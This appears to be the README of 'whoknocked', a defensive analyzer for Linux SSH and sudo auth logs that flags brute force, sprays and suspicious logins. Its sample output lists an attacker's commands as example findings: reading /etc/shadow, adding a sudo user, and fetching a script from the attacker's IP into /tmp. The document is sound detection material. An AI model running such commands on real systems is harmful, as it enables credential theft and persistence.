<h1 align="center">🚪 whoknocked</h1>

<p align="center"><strong>Who knocked on your SSH door?</strong></p>

<p align="center">
A tiny, fast, local analyzer for Linux auth logs. Point it at
<code>/var/log/auth.log</code> and it tells you who tried to get in,
who succeeded, and which of those you should actually worry about.
</p>

<p align="center">
  <a href="https://github.com/tdiprima/whoknocked/actions/workflows/ci.yml"><img alt="CI" src="https://github.com/tdiprima/whoknocked/actions/workflows/ci.yml/badge.svg"></a>
  <a href="https://github.com/tdiprima/whoknocked/releases/latest"><img alt="Release" src="https://img.shields.io/github/v/release/tdiprima/whoknocked"></a>
  <a href="https://crates.io/crates/whoknocked"><img alt="crates.io" src="https://img.shields.io/crates/v/whoknocked"></a>
  <a href="LICENSE"><img alt="MIT" src="https://img.shields.io/badge/license-MIT-blue.svg"></a>
</p>

<p align="center">
  <img src="docs/demo.gif" alt="whoknocked analyzing a sample auth log" width="760">
</p>

Your auth log is thousands of lines of noise with a handful of lines that
matter. `whoknocked` turns the raw text into structured events, runs a small
set of detection rules, and shows you only the **interesting** activity:

- 🔴 **Brute force**: one IP hammering logins
- 🔴 **Login after repeated failures**: a wall of failures, then a success. The one you really want to know about.
- 🔴 **Privileged commands after a suspicious login**: that login, then `sudo cat /etc/shadow`
- 🟡 **Username / password spray**: one IP, many accounts, a couple of tries each
- 🟡 **Direct root login** and **login from a new source** for a known user
- 🟢 **Off-hours login**: a quiet nudge, not an alarm

Plus a **Top sources** table so you can see at a glance who is doing the
knocking, optional **enrichment** (country, network owner, hostname) for
those IPs, a **`--follow`** mode that prints findings live as they happen,
and **`--json`** for piping into jq or your SIEM.

Reads `/var/log/auth.log`, `/var/log/secure`, the **systemd journal**, or
stdin. Single static binary. No daemon, no database, no agent, no cloud. Runs
in milliseconds on a log with hundreds of thousands of lines.

## Try it in 10 seconds

```bash
curl -fsSL https://raw.githubusercontent.com/tdiprima/whoknocked/main/install.sh | sh
sudo whoknocked
```

Or with Cargo:

```bash
cargo install whoknocked
```

No root handy? Run it against the bundled attack story:

```bash
git clone https://github.com/tdiprima/whoknocked.git && cd whoknocked
cargo run --release -- --file examples/sample-auth.log
```

```text
🚪 WHOKNOCKED
Authentication activity — examples/sample-auth.log

Risk: ELEVATED ⚠️

       39   total events
        4   successful logins
        8   failed logins
       14   invalid users
        6   sudo events
        4   unique source IPs
       16   unique usernames

Top sources
────────────────────────────────────────────────────
  IP                 Fails   OK Users  First     Last    
  45.20.13.8            12    1     7  09:14:02  09:18:47
  45.20.10.2             9    0     9  10:02:01  10:03:50
  10.0.0.7               1    1     1  08:55:19  08:55:27
  10.0.0.5               0    2     1  07:58:11  11:15:03

Interesting activity
────────────────────────────────────────────────────

🔴 09:14:02 Possible brute force
   Source:       45.20.13.8
   Failures:     12 (peak 12 within 5 min)
   First seen:   09:14:02
   Last seen:    09:18:00
   Users tried:  root (4), admin (3), backup (1), deploy (1), oracle (1), postgres (1), +1 more

🔴 09:18:47 Login after repeated failures
   User:      backup
   Source:    45.20.13.8
   12 failed attempts, then success after 47s
   Time:      09:18:47
   
   Recommendation:
   Investigate whether this source and login were expected.

🔴 09:19:30 Privileged commands after suspicious login
   User:       backup
   Source:     45.20.13.8
   Login:      09:18:47 (12 failures just before it)
   Commands:
     09:19:30  /usr/bin/cat /etc/shadow
     09:20:02  /usr/sbin/useradd -m -G sudo support
     09:20:40  /usr/bin/curl -s http://45.20.13.8/x.sh -o /tmp/.x
   
   Recommendation:
   Treat this host as potentially compromised until the commands are explained.

🟡 10:02:01 Possible username/password spray
   Source IP:         45.20.10.2
   Accounts tried:    9
   Attempts/account:  1-1
   Duration:          109s
```

Open `examples/sample-auth.log` and you can read the whole story: the attacker
guesses `backup`'s password, logs in, reads `/etc/shadow`, adds a sudo user,
and pulls down a script. `whoknocked` flags the login that made it possible.

## Why not just grep?

You can, and everyone does, right up until the morning after. `grep "Failed
password"` gives you a count. `whoknocked` gives you **correlation**: the
success that followed the failures, the IP that touched nine accounts in two
minutes, and the usernames an attacker thinks you have. It is the view a SIEM
would give you, without the SIEM.

## Automatic log-file detection (Ubuntu vs. RHEL)

Different distributions write SSH/sudo activity to different files. whoknocked
reads `/etc/os-release` and picks the right one for you:

| Distribution family                         | Auth log            |
| ------------------------------------------- | ------------------- |
| Ubuntu, Debian (and derivatives)            | `/var/log/auth.log` |
| RHEL, Rocky, AlmaLinux, CentOS, Fedora, Oracle Linux | `/var/log/secure`   |

Detection uses both the `ID` and `ID_LIKE` fields in `/etc/os-release`, so
derivatives resolve to the correct family automatically. If the expected file
does not exist (Fedora, Arch, and minimal RHEL installs log only to journald),
`whoknocked` falls back to reading the **systemd journal** through
`journalctl`. You can always override the choice with `--file` or `--journal`.

## Requirements

- Nothing, if you use a prebuilt binary. Building from source needs **Rust**
  1.85 or newer (install via [rustup](https://rustup.rs/)).
- A Linux host running **Ubuntu/Debian** or **RHEL/Rocky/AlmaLinux/CentOS/Fedora**.
- Permission to read the auth log. These files are usually restricted, so you
  will typically run whoknocked with `sudo`, or as a user in the `adm` group
  (Debian/Ubuntu) or with the appropriate group on RHEL.

## Install from source

Clone and build a release binary:

```bash
git clone https://github.com/tdiprima/whoknocked.git
cd whoknocked
cargo build --release
```

The binary lands at `target/release/whoknocked`. Copy it somewhere on your
`PATH` if you like:

```bash
sudo install -m 0755 target/release/whoknocked /usr/local/bin/whoknocked
```

Or install straight from the source tree with Cargo:

```bash
cargo install --path .
```

## Usage

### Analyze the auto-detected log

```bash
sudo whoknocked
# OR
RUST_LOG=info /home/<you>/.cargo/bin/whoknocked
```

whoknocked detects your distribution, reads the correct auth log, and prints the
summary plus any findings.

### Analyze a specific file

Handy for testing, for reading a copied/rotated log, or when auto-detection
can't help:

```bash
whoknocked --file /var/log/auth.log
whoknocked --file ./examples/sample-auth.log      # try it without sudo
```

### Read the systemd journal or stdin

```bash
sudo whoknocked --journal                       # sshd / sshd-session / sudo entries
journalctl -u ssh | whoknocked --file -         # or pipe anything syslog-shaped
zcat /var/log/auth.log.2.gz | whoknocked --file -
```

### Watch live

```bash
sudo whoknocked --follow
```

Prints the normal report, then keeps reading. Each new finding is printed the
moment it fires, with a wall-clock stamp. Survives logrotate. Combine with
`--json` to get one JSON object per line, ready for a webhook or `jq`.

### Who is knocking?

```bash
sudo whoknocked --enrich
```

Adds country, city, network owner (ASN), and hostname to the Top sources
table and to every finding, using [ipinfo.io](https://ipinfo.io). Private
addresses are labeled locally and never sent anywhere. Needs network access.

```text
Top sources
────────────────────────────────────────────────────
  IP                 Fails   OK Users  First     Last
  45.20.13.8            12    1     7  09:14:02  09:18:47
     🇺🇸 US, Springdale · AS7018 AT&T Enterprises, LLC
  45.20.10.2             9    0     9  10:02:01  10:03:50
     🇺🇸 US, Rogers · AS7018 AT&T Enterprises, LLC
```

### JSON

```bash
whoknocked --json | jq '.findings[] | select(.severity == "high") | .title'
whoknocked --follow --json | while read -r finding; do curl -s -X POST -d "$finding" "$WEBHOOK"; done
```

### Filters

Filters narrow the events *before* the summary and detectors run.

```bash
whoknocked --failed                 # only failed / invalid-user events
whoknocked --user alex              # only events for user "alex"
whoknocked --ip 45.20.13.8          # only events from one source IP
whoknocked --since 2h               # only the last 2 hours (s / m / h / d)
whoknocked --summary-only           # counts only, skip the detection engine
```

Filters combine, so this shows failed logins for `root` in the last day:

```bash
whoknocked --failed --user root --since 1d
```

### All options

```text
Who knocked on your SSH door? A tiny local analyzer for Linux auth logs that surfaces brute force, sprays, and suspicious logins.

Usage: whoknocked [OPTIONS]

Options:
  -f, --file <PATH>               Log file to analyze, or `-` for stdin. Overrides auto-detection
      --journal                   Read sshd/sudo entries from the systemd journal via `journalctl`
      --follow                    Keep watching and print new findings as they happen (like `tail -f`)
      --enrich                    Look up country, network owner, and hostname for attacker IPs (queries ipinfo.io; needs network access)
      --json                      Emit the report as JSON instead of text (one JSON object per finding in --follow mode)
      --top <N>                   How many source IPs to list in the "Top sources" table [default: 5]
      --failed                    Show only failed / invalid-user events
      --user <NAME>               Show only events for this username
      --ip <IP>                   Show only events from this source IP address
      --since <DURATION>          Only consider events newer than this, e.g. 90m, 2h, 3d
      --summary-only              Print the summary only; skip the detection engine
      --brute-threshold <N>       Brute-force threshold: failures from one IP within the window
      --window-minutes <MINUTES>  Detection window length, in minutes
      --spray-threshold <N>       Password-spray threshold: distinct usernames tried from one IP
      --color <WHEN>              When to use ANSI color in the report [default: auto] [possible values: auto, always, never]
  -h, --help                      Print help
  -V, --version                   Print version
```

Color follows `--color` and the [`NO_COLOR`](https://no-color.org) convention;
piped output is plain text so it is safe to redirect or diff.

## What it detects

Each detector receives the same list of events and independently answers
"anything interesting here?"

1. **Brute force** — at least *N* failed logins from one source IP inside the
   detection window (default: 10 failures / 5 minutes). Reports the IP, total
   and peak failure counts, time span, and which usernames were targeted.

2. **Login after repeated failures** — a *successful* login from an IP that just
   produced a burst of failures (default: 5+ within the window). A normal login
   is dull; this correlation is not, so it is flagged **High**.

3. **Username / password spray** — one source IP touching many distinct
   accounts with only a couple of tries each (default: 8+ users, ≤3 per user).
   This "low and slow" pattern is different from hammering a single account.

4. **Privileged commands after suspicious login** — `sudo` lines carry no IP,
   so this detector ties each command back to the user's most recent SSH
   login. If that login followed a burst of failures (default: 5+ within the
   window), the commands are listed and the finding is **High**.

5. **Direct root login** — a successful SSH login as `root`. Either a policy
   gap or exactly the account an attacker wants. **Medium**.

6. **Login from a new source** — a user with an established source (2+
   logins from one IP) logs in once from somewhere else. **Medium**.

7. **Off-hours login** — a successful login between 23:00 and 06:00 by
   default. Reported at **Normal** severity: not an alarm, just a glance.

Findings are sorted most-severe first and rendered with a risk indicator:
🔴 High, 🟡 Medium, 🟢 Normal.

## Configuration

Every threshold has a sane default and can be set two ways. Precedence, lowest
to highest: **built-in default → environment variable → command-line flag.**

| Setting                  | CLI flag             | Environment variable          | Default |
| ------------------------ | -------------------- | ----------------------------- | ------- |
| Brute-force min failures | `--brute-threshold`  | `WHOKNOCKED_BRUTE_MIN_FAILURES` | `10`    |
| Detection window (min)   | `--window-minutes`   | `WHOKNOCKED_WINDOW_MINUTES`     | `5`     |
| Spray min distinct users | `--spray-threshold`  | `WHOKNOCKED_SPRAY_MIN_USERS`    | `8`     |
| Default log file         | `--file`             | `WHOKNOCKED_FILE`               | auto    |

Example — make the brute-force rule more sensitive for one run:

```bash
WHOKNOCKED_BRUTE_MIN_FAILURES=5 whoknocked
# or
whoknocked --brute-threshold 5 --window-minutes 10
```

### Logging

Diagnostic logging is controlled by `RUST_LOG` and goes to **stderr**, keeping
the report itself clean on stdout. Normal runs are quiet (warnings only).

```bash
RUST_LOG=info whoknocked --file ./examples/sample-auth.log
```

## A note on timestamps

Traditional syslog lines (`Aug 16 09:17:21 ...`) do not include a year.
whoknocked assumes the current year and automatically rolls a timestamp back a
year if it would otherwise land in the future — so logs written in December and
read in January are dated correctly.

## Releases

Tagged pushes (`v0.4.0`) build static binaries for Linux x86_64 and aarch64
(musl) and macOS (Intel and Apple Silicon) and attach them to a GitHub Release.
`install.sh` downloads from there and verifies the SHA-256 checksum.

## Development

Run the full test suite (unit tests for the parser, detectors, config, and
filters, plus end-to-end tests that run the binary against
`examples/sample-auth.log`):

```bash
cargo test
```

Try it end to end without root using the bundled sample:

```bash
cargo run -- --file ./examples/sample-auth.log
```

### Project layout

```text
src/
├── main.rs          Orchestration only: wire the pieces together
├── cli.rs           Argument definitions and --since validation
├── config.rs        Detector thresholds (defaults → env → flags)
├── os_detect.rs     Distribution detection → auth log path
├── source.rs        Log file, stdin, or journalctl: resolution and opening
├── loader.rs        Line parsing loop, year correction, and view filters
├── follow.rs        --follow: tail a source and print new findings live
├── enrich.rs        --enrich: ipinfo.io lookups for source IPs
├── attackers.rs     "Top sources" rollup
├── parser.rs        Raw syslog line → structured AuthEvent
├── event.rs         AuthEvent and EventType definitions
├── summary.rs       Aggregate counts
├── finding.rs       Finding and Severity types
├── report.rs        Text and JSON report rendering
└── detections/
    ├── mod.rs                    Detection trait + registry
    ├── brute_force.rs            Detection #1
    ├── login_after_failures.rs   Detection #2 (correlation)
    ├── password_spray.rs         Detection #3
    ├── sudo_after_suspicious.rs  Detection #4 (correlation)
    ├── root_login.rs             Detection #5
    ├── new_source.rs             Detection #6
    └── off_hours.rs              Detection #7
```

The parsing and detection logic is pure (no I/O), so it is fully unit-testable
without elevated privileges. All filesystem, process, and network access is
isolated in `source.rs`, `os_detect.rs`, `follow.rs`, and `enrich.rs`.

### Adding a new detector

1. Create `src/detections/your_rule.rs` implementing the `Detection` trait.
2. Register it in `all_detectors()` in `src/detections/mod.rs`.

That's the only wiring required. See [CONTRIBUTING.md](CONTRIBUTING.md) for
a walkthrough and ideas for detectors we would love to merge.

### Regenerating the demo GIF

```bash
brew install vhs          # or see https://github.com/charmbracelet/vhs
cargo build --release
vhs docs/demo.tape
```

## License

[MIT](LICENSE) © 2026 Tammy DiPrima

<br>
